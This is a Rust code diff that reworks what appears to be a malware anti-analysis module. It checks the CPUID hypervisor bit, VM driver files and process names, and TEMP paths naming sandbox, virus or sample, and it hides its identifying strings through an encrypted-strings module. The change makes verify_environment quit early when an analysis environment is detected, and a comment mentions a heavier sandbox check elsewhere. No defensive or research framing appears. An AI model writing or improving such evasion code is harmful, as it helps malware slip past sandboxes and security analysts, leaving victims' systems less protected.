@@ -1,10 +1,8 @@
-use std::time::Instant;
 use crate::encrypted::*;
 
 #[allow(dead_code)]
 fn check_cpuid_hypervisor() -> bool {
-    let result = unsafe { core::arch::x86_64::__cpuid(1) };
-    result.ecx & (1 << 31) != 0
+    unsafe { core::arch::x86_64::__cpuid(1).ecx & (1 << 31) != 0 }
 }
 
 fn check_names() -> bool {
@@ -45,24 +43,7 @@ fn check_files() -> bool {
         s_det_vm3dmp_sys(),
     ];
     for name in &checks {
-        if drivers.join(&name).exists() { return true; }
-    }
-    false
-}
-
-fn check_uptime() -> bool {
-    if !crate::core::api::check_uptime() {
-        return true;
-    }
-    false
-}
-
-fn check_resources() -> bool {
-    if !crate::core::api::check_cpu_count() {
-        return true;
-    }
-    if !crate::core::api::check_ram() {
-        return true;
+        if drivers.join(name).exists() { return true; }
     }
     false
 }
@@ -70,15 +51,21 @@ fn check_resources() -> bool {
 fn check_temp_path() -> bool {
     if let Ok(temp) = std::env::var(s_det_temp_env()) {
         let lower = temp.to_lowercase();
-        if lower.contains(&s_det_temp_sandbox().to_lowercase()) || lower.contains(&s_det_temp_virus().to_lowercase()) || lower.contains(&s_det_temp_sample().to_lowercase()) {
+        if lower.contains(&s_det_temp_sandbox().to_lowercase())
+            || lower.contains(&s_det_temp_virus().to_lowercase())
+            || lower.contains(&s_det_temp_sample().to_lowercase())
+        {
             return true;
         }
     }
     false
 }
 
+/// Quick pre-flight check: returns false if clearly in a sandbox/VM.
+/// This runs before the heavy composite check in sandbox.rs.
 pub fn verify_environment() -> bool {
-    let start = Instant::now();
-    std::thread::sleep(std::time::Duration::from_millis(500));
+    if check_names()     { return false; }
+    if check_files()     { return false; }
+    if check_temp_path() { return false; }
     true
 }
